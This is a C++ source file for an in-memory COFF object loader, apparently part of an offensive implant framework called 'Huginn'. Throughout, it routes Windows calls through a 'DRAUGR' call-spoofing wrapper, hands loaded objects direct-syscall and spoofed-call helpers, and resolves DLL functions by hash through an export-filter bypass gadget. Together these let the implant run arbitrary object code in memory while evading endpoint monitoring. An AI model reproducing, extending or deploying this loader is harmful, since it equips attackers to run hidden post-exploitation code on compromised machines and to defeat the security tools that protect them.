#include <windows.h>
#include "Native.h"
#include "CoffHeaders.h"
#include "CoffUtils.h"
#include "Prototypes.h"
#include "Macros.h"

typedef enum _SYMBOL_IMPORT_TYPE {
	IMPORT_HUGINN_API,
	IMPORT_DLL_FUNCTION,
	IMPORT_UNDEFINED,
	IMPORT_ENTRY_POINT,
	IMPORT_OTHER,
} SYMBOL_IMPORT_TYPE;


D_SEC(D)
DWORD	CharacteristicsToProtection
(
	_In_	DWORD	Characteristics
)
{
	DWORD dwMemProtect = PAGE_READWRITE;

	if (Characteristics & IMAGE_SCN_MEM_WRITE)
		dwMemProtect = PAGE_WRITECOPY;

	if (Characteristics & IMAGE_SCN_MEM_READ)
		dwMemProtect = PAGE_READONLY;

	if ((Characteristics & IMAGE_SCN_MEM_WRITE) && (Characteristics & IMAGE_SCN_MEM_READ))
		dwMemProtect = PAGE_READWRITE;

	if (Characteristics & IMAGE_SCN_MEM_EXECUTE)
		dwMemProtect = PAGE_EXECUTE;

	if ((Characteristics & IMAGE_SCN_MEM_EXECUTE) && (Characteristics & IMAGE_SCN_MEM_WRITE))
		dwMemProtect = PAGE_EXECUTE_WRITECOPY;

	if ((Characteristics & IMAGE_SCN_MEM_EXECUTE) && (Characteristics & IMAGE_SCN_MEM_READ))
		dwMemProtect = PAGE_EXECUTE_READ;

	if ((Characteristics & IMAGE_SCN_MEM_EXECUTE) && (Characteristics & IMAGE_SCN_MEM_WRITE) && (Characteristics & IMAGE_SCN_MEM_READ))
		dwMemProtect = PAGE_EXECUTE_READWRITE;

	return dwMemProtect;
}

D_SEC(D)
void FlushCodeSections
(
	_In_ 	PCOFF_LOADER_CONTEXT 	pCoffContext
)
{
	for (int iSection = 0; iSection < pCoffContext->pCoffFileHeader->NumberOfSections; iSection++)
	{
		if (pCoffContext->pMemSections[iSection].InMemoryAddress &&
			pCoffContext->pMemSections[iSection].InMemorySize > 0)
		{
			DRAUGR_API(
				NtFlushInstructionCache,
				NtCurrentProcess,
				(PVOID)pCoffContext->pMemSections[iSection].InMemoryAddress,
				pCoffContext->pMemSections[iSection].InMemorySize
			);
		}
	}
}

D_SEC(D)
bool    InitializeCoffContext
(
    _Inout_ PCOFF_LOADER_CONTEXT    pCoffContext,
    _In_    PVOID                   pCoffContent,
    _In_    DWORD                   dwCoffSize
)
{
	PVOID hHeapSaved = pCoffContext->hHeap;
	_memset(pCoffContext, 0, sizeof(COFF_LOADER_CONTEXT));
	pCoffContext->hHeap = hHeapSaved;

	pCoffContext->pCoffContent = pCoffContent;
	pCoffContext->dwCoffSize = dwCoffSize;
	pCoffContext->dwIatIndex = 0;
	pCoffContext->pEntryPoint = nullptr;

	if (dwCoffSize < sizeof(COFF_FILE_HEADER)) {
		return false;
	}

	pCoffContext->pCoffFileHeader = reinterpret_cast<PCOFF_FILE_HEADER>(pCoffContent);

	PCOFF_FILE_HEADER pHdr = pCoffContext->pCoffFileHeader;

	if (pHdr->Machine != MACHINETYPE_AMD64) {
		return false;
	}

	DWORD dwSectionTableEnd = sizeof(COFF_FILE_HEADER) +
		pHdr->SizeOfOptionalHeader +
		(pHdr->NumberOfSections * sizeof(COFF_SECTION));

	if (dwSectionTableEnd > dwCoffSize) {
		return false;
	}

	if (pHdr->NumberOfSymbols > 0) {
		if (pHdr->PointerToSymbolTable >= dwCoffSize) {
			return false;
		}
		DWORD dwSymTableEnd = pHdr->PointerToSymbolTable +
			pHdr->NumberOfSymbols * sizeof(COFF_SYMBOL);
		if (dwSymTableEnd > dwCoffSize) {
			return false;
		}
	}

	PVOID pIatBase = nullptr;
	SIZE_T sIatSize = IAT_TABLE_SIZE;
	NTSTATUS Status = static_cast<NTSTATUS>(DRAUGR_API(
		NtAllocateVirtualMemory,
		NtCurrentProcess,
		&pIatBase,
		0,
		&sIatSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	));
	if (!NT_SUCCESS(Status)) {
		return false;
	}
	pCoffContext->pIatTable = reinterpret_cast<PBYTE>(pIatBase);

	return true;
}

D_SEC(D)
bool    AllocateMemorySection
(
    _In_    PCOFF_LOADER_CONTEXT    pCoffContext
)
{
	PCOFF_FILE_HEADER pCoffFileHeader = pCoffContext->pCoffFileHeader;
	pCoffContext->pMemSections = reinterpret_cast<PCOFF_MEM_SECTION>(
		DRAUGR_API(RtlAllocateHeap, pCoffContext->hHeap, HEAP_ZERO_MEMORY,
			pCoffFileHeader->NumberOfSections * sizeof(COFF_MEM_SECTION))
	);

	if (!pCoffContext->pMemSections) {
		return false;
	}

	for (int iSection = 0; iSection < pCoffFileHeader->NumberOfSections; iSection++)
	{
		PCOFF_SECTION pCoffSection = reinterpret_cast<PCOFF_SECTION>(
			reinterpret_cast<UINT_PTR>(pCoffContext->pCoffContent) +
			sizeof(COFF_FILE_HEADER) +
			pCoffFileHeader->SizeOfOptionalHeader +
			(sizeof(COFF_SECTION) * iSection)
		);
		DWORD dwAllocSize = pCoffSection->SizeOfRawData;
		if (pCoffSection->VirtualSize > dwAllocSize)
			dwAllocSize = pCoffSection->VirtualSize;

		if (dwAllocSize > 0)
		{
			if (pCoffSection->SizeOfRawData > 0 &&
				(DWORD)(pCoffSection->PointerToRawData + pCoffSection->SizeOfRawData) > pCoffContext->dwCoffSize)
			{
				return false;
			}

			if (pCoffSection->NumberOfRelocations > 0 &&
				(DWORD)(pCoffSection->PointerToRelocations +
					pCoffSection->NumberOfRelocations * sizeof(COFF_RELOCATION)) > pCoffContext->dwCoffSize)
			{
				return false;
			}

			pCoffContext->pMemSections[iSection].Counter = iSection;
			_memcpy(
				pCoffContext->pMemSections[iSection].Name,
				pCoffSection->Name,
				8
			);

			pCoffContext->pMemSections[iSection].SizeOfRawData = pCoffSection->SizeOfRawData;
			pCoffContext->pMemSections[iSection].InMemorySize = dwAllocSize;
			pCoffContext->pMemSections[iSection].PointerToRawData = pCoffSection->PointerToRawData;
			pCoffContext->pMemSections[iSection].PointerToRelocations = pCoffSection->PointerToRelocations;
			pCoffContext->pMemSections[iSection].NumberOfRelocations = pCoffSection->NumberOfRelocations;
			pCoffContext->pMemSections[iSection].Characteristics = pCoffSection->Characteristics;

			PVOID pSectionBase = nullptr;
			SIZE_T sSectionSize = dwAllocSize;

			NTSTATUS Status = (NTSTATUS)DRAUGR_API(
				NtAllocateVirtualMemory,
				NtCurrentProcess, 
				&pSectionBase, 
				0, 
				&sSectionSize,
				MEM_COMMIT | MEM_RESERVE, 
				PAGE_READWRITE
			);
			if (!NT_SUCCESS(Status)) {
				return false;
			}
			pCoffContext->pMemSections[iSection].InMemoryAddress = reinterpret_cast<UINT_PTR>(pSectionBase);

			if (pCoffSection->SizeOfRawData > 0)
			{
				PVOID pRawData = reinterpret_cast<PVOID>(
					reinterpret_cast<UINT_PTR>(pCoffContext->pCoffContent) +
					pCoffSection->PointerToRawData
				);

				_memcpy(
					reinterpret_cast<PVOID>(pCoffContext->pMemSections[iSection].InMemoryAddress),
					pRawData,
					pCoffSection->SizeOfRawData
				);
			}
		}
	}

	return true;
}

D_SEC(D)
PVOID SymbolIsCoffApi(
	_In_	LPSTR	lpSymbolName
)
{
	if(_strcmp(lpSymbolName, "__imp_CoffLoadLibraryA")) {
		return reinterpret_cast<PVOID>(&CoffLoadLibraryA);
	}

	if(_strcmp(lpSymbolName, "__imp_CoffResolveSyscall")) {
		return reinterpret_cast<PVOID>(&CoffResolveSyscall);
	}

	if(_strcmp(lpSymbolName, "__imp_CoffPrepareSyscall")) {
		return reinterpret_cast<PVOID>(&CoffPrepareSyscall);
	}

	if(_strcmp(lpSymbolName, "__imp_CoffDoSyscall")) {
		return reinterpret_cast<PVOID>(&CoffDoSyscall);
	}

	if(_strcmp(lpSymbolName, "__imp_CoffSpoofCall")) {
		return reinterpret_cast<PVOID>(&CoffSpoofCall);
	}

	if(_strcmp(lpSymbolName, "__imp_CoffAlloc")) {
		return reinterpret_cast<PVOID>(&CoffAlloc);
	}

	if(_strcmp(lpSymbolName, "__imp_CoffFree")) {
		return reinterpret_cast<PVOID>(&CoffFree);
	}

	return nullptr;
}


D_SEC(D)
SYMBOL_IMPORT_TYPE DetectTypeOfSymbol(
	_In_	LPSTR	lpSymbolName
)
{
	if(
		_memcmp(lpSymbolName, (PVOID)"__imp", 5)
	)
	{
		if(
			_memcmp(lpSymbolName, (PVOID)"__imp_Coff", 10)
		)
		{
			return IMPORT_HUGINN_API;
		}

		LPSTR pTmp = lpSymbolName;
		while(*pTmp)
		{
			if(*pTmp == '$') {
				return IMPORT_DLL_FUNCTION;
			}
			pTmp++;
		}
	}

	if(
		_memcmp(lpSymbolName, (PVOID)"go", 2)
	)
	{
		return IMPORT_ENTRY_POINT;
	}

	if(
		_memcmp(lpSymbolName, (PVOID)"__UNDEFINED", 11)
	)
	{
		return IMPORT_UNDEFINED;
	}

	return IMPORT_OTHER;
}

D_SEC(D)
bool LoadAndResolveSymbols(
	_Inout_ PCOFF_LOADER_CONTEXT 	pCoffContext
)
{
	PCOFF_FILE_HEADER pCoffFileHeader = pCoffContext->pCoffFileHeader;


	pCoffContext->pMemSymbols = reinterpret_cast<PCOFF_SYM_ADDR>(
		DRAUGR_API(
			RtlAllocateHeap,
			pCoffContext->hHeap, 
			HEAP_ZERO_MEMORY,
			pCoffFileHeader->NumberOfSymbols * sizeof(COFF_SYM_ADDR)
		)
	);

	if (!pCoffContext->pMemSymbols) {
		return false;
	}

	pCoffContext->pCoffSymTable = reinterpret_cast<PCOFF_SYMBOL>(
		reinterpret_cast<UINT_PTR>(pCoffContext->pCoffContent) +
		pCoffFileHeader->PointerToSymbolTable
	);

	pCoffContext->pStringTable = (PBYTE)(
		reinterpret_cast<UINT_PTR>(pCoffContext->pCoffContent) +
		pCoffFileHeader->PointerToSymbolTable +
		pCoffFileHeader->NumberOfSymbols * sizeof(COFF_SYMBOL)
	);

	SYMBOL_IMPORT_TYPE ImportType;

	DWORD dwStrTableBase = pCoffFileHeader->PointerToSymbolTable +
		pCoffFileHeader->NumberOfSymbols * sizeof(COFF_SYMBOL);

	for (int iSym = 0; iSym < (int)pCoffFileHeader->NumberOfSymbols; iSym++)
	{
		BYTE szSymbolName[MEM_SYMNAME_MAX] = "";

		if (pCoffContext->pCoffSymTable[iSym].SectionNumber == 0 &&
			pCoffContext->pCoffSymTable[iSym].StorageClass == 0)
		{
			_memcpy(szSymbolName, (PVOID)"__UNDEFINED", 12);
		}
		else
		{
			if (pCoffContext->pCoffSymTable[iSym].first.Zeros != 0) {
				_memcpy(szSymbolName, pCoffContext->pCoffSymTable[iSym].first.ShortName, 8);
			}
			else {
				DWORD dwStrOffset = pCoffContext->pCoffSymTable[iSym].first.Offset;
				if (dwStrTableBase + dwStrOffset >= pCoffContext->dwCoffSize) {
					return false;
				}

				DWORD dwAvailable = pCoffContext->dwCoffSize - (dwStrTableBase + dwStrOffset);
				DWORD dwCopyLen = (dwAvailable < MEM_SYMNAME_MAX - 1) ? dwAvailable : (DWORD)(MEM_SYMNAME_MAX - 1);

				_memcpy(
					szSymbolName,
					(PBYTE)(pCoffContext->pStringTable + dwStrOffset),
					dwCopyLen
				);
				szSymbolName[dwCopyLen] = '\0';
			}
		}

		_memcpy(pCoffContext->pMemSymbols[iSym].Name, szSymbolName, MEM_SYMNAME_MAX);
		pCoffContext->pMemSymbols[iSym].Counter = iSym;
		pCoffContext->pMemSymbols[iSym].SectionNumber = pCoffContext->pCoffSymTable[iSym].SectionNumber;
		pCoffContext->pMemSymbols[iSym].Value = pCoffContext->pCoffSymTable[iSym].Value;
		pCoffContext->pMemSymbols[iSym].StorageClass = pCoffContext->pCoffSymTable[iSym].StorageClass;

		pCoffContext->pMemSymbols[iSym].GOTaddress = 0;

		if (pCoffContext->pMemSymbols[iSym].SectionNumber >= 0xFFFE) {
			pCoffContext->pMemSymbols[iSym].InMemoryAddress = NULL;
			goto skip_aux;
		}

		ImportType = DetectTypeOfSymbol(reinterpret_cast<LPSTR>(szSymbolName));
		switch(ImportType)
		{
			case IMPORT_HUGINN_API:
			{
				PVOID FunctionAddress = SymbolIsCoffApi(reinterpret_cast<LPSTR>(szSymbolName));
				pCoffContext->pMemSymbols[iSym].InMemoryAddress = reinterpret_cast<UINT_PTR>(FunctionAddress);
				PBYTE pIatEntry = pCoffContext->pIatTable + (pCoffContext->dwIatIndex * 8);
				if ((DWORD)(pIatEntry - pCoffContext->pIatTable) + sizeof(UINT_PTR) > IAT_TABLE_SIZE) {
					return false;
				}

				_memcpy(pIatEntry, &pCoffContext->pMemSymbols[iSym].InMemoryAddress, sizeof(UINT_PTR));
				pCoffContext->pMemSymbols[iSym].GOTaddress = reinterpret_cast<UINT_PTR>(pIatEntry);
				pCoffContext->dwIatIndex++;
				break;
			}

			case IMPORT_UNDEFINED:
			{
				pCoffContext->pMemSymbols[iSym].InMemoryAddress = NULL;
				break;
			}

			case IMPORT_DLL_FUNCTION:
			{
				LPSTR lpDllName = NULL;
				LPSTR lpFuncName = NULL;
				lpDllName = (LPSTR)szSymbolName + IMPORT_PATTERN_SIZE;
				_strtok_s(lpDllName, "$", &lpFuncName);

				HMODULE	hModuleAddress = (HMODULE)DRAUGR_API(LoadLibraryA, lpDllName);
				if(hModuleAddress)
				{
					PVOID FunctionAddress = (PVOID)ResolveProcedureAddressWithHash(
						GLOBAL_INSTANCE->EafGadget,
						hModuleAddress, 
						HashStringA(lpFuncName)
					);

					if(FunctionAddress)
					{
						pCoffContext->pMemSymbols[iSym].InMemoryAddress = reinterpret_cast<UINT_PTR>(FunctionAddress);

						PBYTE pIatEntry = pCoffContext->pIatTable + (pCoffContext->dwIatIndex * 8);
						if ((DWORD)(pIatEntry - pCoffContext->pIatTable) + sizeof(UINT_PTR) > IAT_TABLE_SIZE) {
							return false;
						}

						_memcpy(pIatEntry, &pCoffContext->pMemSymbols[iSym].InMemoryAddress, sizeof(UINT_PTR));
						pCoffContext->pMemSymbols[iSym].GOTaddress = reinterpret_cast<UINT_PTR>(pIatEntry);
						pCoffContext->dwIatIndex++;
					}
					else
					{
						return false;
					}
				}
				else
				{
					return false;
				}

				break;
			}
			case IMPORT_ENTRY_POINT:
			{
				if (pCoffContext->pMemSymbols[iSym].SectionNumber == 0) {
					return false;
				}
				DWORD dwSectionIndex = pCoffContext->pMemSymbols[iSym].SectionNumber - 1;
				if (dwSectionIndex >= (DWORD)pCoffFileHeader->NumberOfSections) {
					return false;
				}
				pCoffContext->pMemSymbols[iSym].InMemoryAddress =
					pCoffContext->pMemSections[dwSectionIndex].InMemoryAddress +
					pCoffContext->pMemSymbols[iSym].Value;

				pCoffContext->pEntryPoint = (void*)pCoffContext->pMemSymbols[iSym].InMemoryAddress;
				break;
			}

			case IMPORT_OTHER:
			{
				if (pCoffContext->pMemSymbols[iSym].SectionNumber == 0) {
					return false;
				}
				DWORD dwSectionIndex = pCoffContext->pMemSymbols[iSym].SectionNumber - 1;
				if (dwSectionIndex >= (DWORD)pCoffFileHeader->NumberOfSections) {
					return false;
				}
				pCoffContext->pMemSymbols[iSym].InMemoryAddress =
					pCoffContext->pMemSections[dwSectionIndex].InMemoryAddress +
					pCoffContext->pMemSymbols[iSym].Value;

				break;
			}
		}

skip_aux:
		BYTE nAux = pCoffContext->pCoffSymTable[iSym].NumberOfAuxSymbols;
		for (BYTE iAux = 0; iAux < nAux && (iSym + 1) < (int)pCoffFileHeader->NumberOfSymbols; iAux++)
		{
			iSym++;
			_memcpy(pCoffContext->pMemSymbols[iSym].Name, (PVOID)"__UNDEFINED", 12);
			pCoffContext->pMemSymbols[iSym].Counter = iSym;
			pCoffContext->pMemSymbols[iSym].SectionNumber = 0;
			pCoffContext->pMemSymbols[iSym].Value = 0;
			pCoffContext->pMemSymbols[iSym].StorageClass = 0;
			pCoffContext->pMemSymbols[iSym].InMemoryAddress = NULL;
			pCoffContext->pMemSymbols[iSym].GOTaddress = 0;
		}
	}

	return true;
}

D_SEC(D)
bool ApplyRelocations
(
	_Inout_ PCOFF_LOADER_CONTEXT pCoffContext
)
{
	PCOFF_FILE_HEADER pCoffFileHeader = pCoffContext->pCoffFileHeader;

	UINT_PTR u64RelocValue = 0;
	UINT  i32RelocValue = 0;
	PBYTE    pRelocTarget = NULL;
	INT64   i64RelocOffset = 0;
	UINT  i32RelocOffset = 0;

	for (int iSection = 0; iSection < pCoffFileHeader->NumberOfSections; iSection++)
	{
		if (pCoffContext->pMemSections[iSection].NumberOfRelocations == 0)
			continue;

		for (int iReloc = 0; iReloc < pCoffContext->pMemSections[iSection].NumberOfRelocations; iReloc++)
		{
			PCOFF_RELOCATION pCoffRelocation = (PCOFF_RELOCATION)(
				(PBYTE)pCoffContext->pCoffContent +
				pCoffContext->pMemSections[iSection].PointerToRelocations +
				sizeof(COFF_RELOCATION) * iReloc
			);

			pRelocTarget = (PBYTE)pCoffContext->pMemSections[iSection].InMemoryAddress +
				pCoffRelocation->VirtualAddress;

			switch (pCoffRelocation->Type)
			{
			case IMAGE_REL_AMD64_ADDR64:    // Type 0x1
			{
				_memcpy(&i64RelocOffset, pRelocTarget, sizeof(UINT));
				u64RelocValue = pCoffContext->pMemSymbols[pCoffRelocation->SymbolTableIndex].InMemoryAddress +
					i64RelocOffset;
				_memcpy(pRelocTarget, &u64RelocValue, sizeof(UINT_PTR));
				break;
			}

			case IMAGE_REL_AMD64_ADDR32NB:  // Type 0x3
			{
				_memcpy(&i32RelocOffset, pRelocTarget, sizeof(UINT));
				i32RelocValue = (UINT)(
					i32RelocOffset +
					(pCoffContext->pMemSymbols[pCoffRelocation->SymbolTableIndex].InMemoryAddress) -
					((INT64)pRelocTarget + 4)
				);
				_memcpy(pRelocTarget, &i32RelocValue, sizeof(UINT));
				break;
			}

			case IMAGE_REL_AMD64_REL32:     // Type 0x4
			{
				_memcpy(&i32RelocOffset, pRelocTarget, sizeof(UINT));

				if (pCoffContext->pMemSymbols[pCoffRelocation->SymbolTableIndex].GOTaddress != NULL) {
					i32RelocValue = (UINT)(
						(pCoffContext->pMemSymbols[pCoffRelocation->SymbolTableIndex].GOTaddress) -
						((INT64)pRelocTarget + 4)
					);
				}
				else {
					i32RelocValue = (UINT)(
						i32RelocOffset +
						(pCoffContext->pMemSymbols[pCoffRelocation->SymbolTableIndex].InMemoryAddress) -
						((INT64)pRelocTarget + 4)
					);
				}
				_memcpy(pRelocTarget, &i32RelocValue, sizeof(UINT));
				break;
			}

			case IMAGE_REL_AMD64_REL32_4:   // Type 0x8
			{
				_memcpy(&i32RelocOffset, pRelocTarget, sizeof(UINT));
				i32RelocValue = (UINT)(
					i32RelocOffset +
					(pCoffContext->pMemSymbols[pCoffRelocation->SymbolTableIndex].InMemoryAddress) -
					((INT64)pRelocTarget + 4 + 4)
				);
				_memcpy(pRelocTarget, &i32RelocValue, sizeof(UINT));
				break;
			}

			default:
			{
				return false;
			}
			}
		}
	}

	return true;
}



D_SEC(D)
bool	ApplyMemoryProtection(
	_In_	PCOFF_LOADER_CONTEXT	pCoffContext
)
{
	for (int i = 0; i < pCoffContext->pCoffFileHeader->NumberOfSections; i++)
	{
		DWORD	dwMemProtect = CharacteristicsToProtection(pCoffContext->pMemSections[i].Characteristics);

		if (pCoffContext->pMemSections[i].InMemorySize == 0)
			continue;

		if (dwMemProtect != PAGE_READWRITE)
		{
			PVOID pProtBase = reinterpret_cast<PVOID>(pCoffContext->pMemSections[i].InMemoryAddress);
			SIZE_T sProtSize = pCoffContext->pMemSections[i].InMemorySize;
			ULONG ulOldProtect = 0;
			NTSTATUS Status = (NTSTATUS)DRAUGR_API(
				NtProtectVirtualMemory,
				NtCurrentProcess, 
				&pProtBase, 
				&sProtSize,
				dwMemProtect, 
				&ulOldProtect
			);
			if (!NT_SUCCESS(Status))
			{
				return false;
			}
		}

	}

	PVOID pIatProtBase = (PVOID)pCoffContext->pIatTable;
	SIZE_T sIatProtSize = IAT_TABLE_SIZE;
	ULONG ulIatOldProtect = 0;
	NTSTATUS Status = (NTSTATUS)DRAUGR_API(
		NtProtectVirtualMemory,
		NtCurrentProcess, 
		&pIatProtBase, 
		&sIatProtSize,
		PAGE_READONLY, 
		&ulIatOldProtect
	);

	if (!NT_SUCCESS(Status))
	{
		return false;
	}

	return true;
}

D_SEC(D)
bool ExecuteEntryPoint(
	_In_ 	PCOFF_LOADER_CONTEXT	pCoffContext,
	_In_	PVOID					pCoffArgs
)
{
	if (pCoffContext->pEntryPoint == NULL) {
		return false;
	}

	FlushCodeSections(pCoffContext);
	((pfnEntryPoint)pCoffContext->pEntryPoint)(pCoffArgs);

	return true;
}

D_SEC(D)
VOID FreeCoffContext(
	_Inout_ PCOFF_LOADER_CONTEXT 	pCoffContext
)
{
	if (pCoffContext->pMemSections) {
		for (int i = 0; i < pCoffContext->pCoffFileHeader->NumberOfSections; i++) {
			if (pCoffContext->pMemSections[i].InMemoryAddress) {
				PVOID pBase = reinterpret_cast<PVOID>(pCoffContext->pMemSections[i].InMemoryAddress);
				SIZE_T sSize = 0;
				DRAUGR_API(
					NtFreeVirtualMemory,
					NtCurrentProcess, 
					&pBase, 
					&sSize, 
					MEM_RELEASE
				);
			}
		}
		DRAUGR_API(
			RtlFreeHeap,
			pCoffContext->hHeap, 
			0, 
			pCoffContext->pMemSections
		);
	}

	if (pCoffContext->pMemSymbols) {
		DRAUGR_API(
			RtlFreeHeap,
			pCoffContext->hHeap, 
			0, 
			pCoffContext->pMemSymbols
		);	
	}

	if (pCoffContext->pIatTable) {
		PVOID pIatBase = (PVOID)pCoffContext->pIatTable;
		SIZE_T sIatSize = 0;
		DRAUGR_API(
			NtFreeVirtualMemory,
			NtCurrentProcess, 
			&pIatBase, 
			&sIatSize, 
			MEM_RELEASE
		);
	}

	if (pCoffContext->pCoffContent) {
		PVOID pContentBase = pCoffContext->pCoffContent;
		SIZE_T sContentSize = 0;
		DRAUGR_API(
			NtFreeVirtualMemory,
			NtCurrentProcess, 
			&pContentBase, 
			&sContentSize, 
			MEM_RELEASE
		);
	}

	if (pCoffContext->hHeap) {
		DRAUGR_API(
			RtlDestroyHeap,
			pCoffContext->hHeap
		);
	}

	_memset(pCoffContext, 0, sizeof(COFF_LOADER_CONTEXT));
}
